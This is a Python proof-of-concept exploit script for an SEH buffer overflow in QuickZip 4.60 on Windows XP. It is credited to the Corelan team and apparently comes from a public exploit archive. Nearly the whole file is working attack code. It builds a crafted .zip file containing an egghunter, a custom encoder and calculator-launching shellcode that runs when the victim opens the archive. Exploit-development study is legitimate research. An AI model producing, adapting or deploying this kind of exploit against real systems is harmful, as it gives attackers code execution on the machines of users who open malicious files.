#!/usr/bin/python
#
# ###############################################################################
# Exploit Title : QuickZip 4.x (.zip) 0day Local Universal Buffer Overflow PoC Exploit
# Date          : 9/3/2010
# Author        : corelanc0d3r & mr_me
# Bug found by  : corelanc0d3r (http://corelan.be:8800/)
# Software Link : http://www.quickzip.org/downloads.html
# Version       : 4.60
# OS            : Windows
# Tested on     : XP SP3 En
# Type of vuln  : SEH
# Greetz to     : Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
# ###############################################################################
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code. 
# If you do, Corelan cannot be held responsible for any damages this may cause.
#
# how does this work?
# http://www.offensive-security.com/blog/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/
 
print "|------------------------------------------------------------------|"
print "|                         __               __                      |"
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
print "|                                                                  |"
print "|                                       http://www.corelan.be:8800 |"
print "|                                              security@corelan.be |"
print "|                                                                  |"
print "|-------------------------------------------------[ EIP Hunters ]--|"
print "[+] QuickZip 4.x (.zip) 0day Local Universal Buffer Overflow PoC Exploit"
 
header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")
 
header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")
 
# pure ascii egghunter, thanks to skylined
egghunter= ("JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIQvK1"
"9ZKO6orbv2bJgr2xZmtnulfePZPthoOHbwFPtpbtLKkJLo1eJJloPuKW9okWA");
 
calc = ("\xd9\xf7\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
"\x4c\x4a\x48\x51\x54\x45\x50\x43\x30\x45\x50\x4c\x4b\x51\x55"
"\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x43\x31\x4a\x4f\x4c"
"\x4b\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x47\x50\x45\x51\x4a\x4b"
"\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50\x31\x49"
"\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x42\x54\x44\x47\x49\x51"
"\x49\x5a\x44\x4d\x45\x51\x49\x52\x4a\x4b\x4b\x44\x47\x4b\x50"
"\x54\x47\x54\x45\x54\x44\x35\x4d\x35\x4c\x4b\x51\x4f\x51\x34"
"\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x51"
"\x4f\x45\x4c\x43\x31\x4a\x4b\x4c\x4b\x45\x4c\x4c\x4b\x43\x31"
"\x4a\x4b\x4c\x49\x51\x4c\x46\x44\x43\x34\x48\x43\x51\x4f\x50"
"\x31\x4a\x56\x43\x50\x50\x56\x42\x44\x4c\x4b\x50\x46\x50\x30"
"\x4c\x4b\x47\x30\x44\x4c\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c"
"\x4b\x42\x48\x45\x58\x4b\x39\x4a\x58\x4b\x33\x49\x50\x42\x4a"
"\x50\x50\x42\x48\x4c\x30\x4c\x4a\x44\x44\x51\x4f\x45\x38\x4a"
"\x38\x4b\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43"
"\x45\x31\x42\x4c\x43\x53\x46\x4e\x43\x55\x43\x48\x45\x35\x45"
"\x50\x41\x41");
 
# custom encoder
encoder = ("\x25\x4A\x4D\x4E\x55"  
"\x25\x35\x32\x31\x2A"         
"\x2d\x55\x55\x55\x5f"         
"\x2d\x56\x55\x56\x5f"         
"\x2d\x55\x55\x55\x5e"         
"\x50"                         
"\x25\x4A\x4D\x4E\x55"  
"\x25\x35\x32\x31\x2A"         
"\x2d\x2b\x6a\x32\x53"         
"\x2d\x2a\x6a\x31\x54"         
"\x2d\x2a\x69\x31\x54"         
"\x50"                         
);
 
print "[+] Building PoC.."
 
lol = "\x43" * 20
lol += egghunter
lol += "\x41" * (223-len(lol))
lol += "\x61"
lol += "\x53"
lol += "\x5c"
lol += encoder
lol += "\x41" * (294-len(lol))
lol += "\x73\xf9\x41\x41"
lol += "\x5c\x53\x46\x00"
lol += "W00TW00T"
lol += calc
lol += "\x42" * (4064-len(lol))
lol += ".txt"
 
exploit = header_1 + lol + header_2 + lol + header_3
 
mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()
print "[+] Exploit complete!"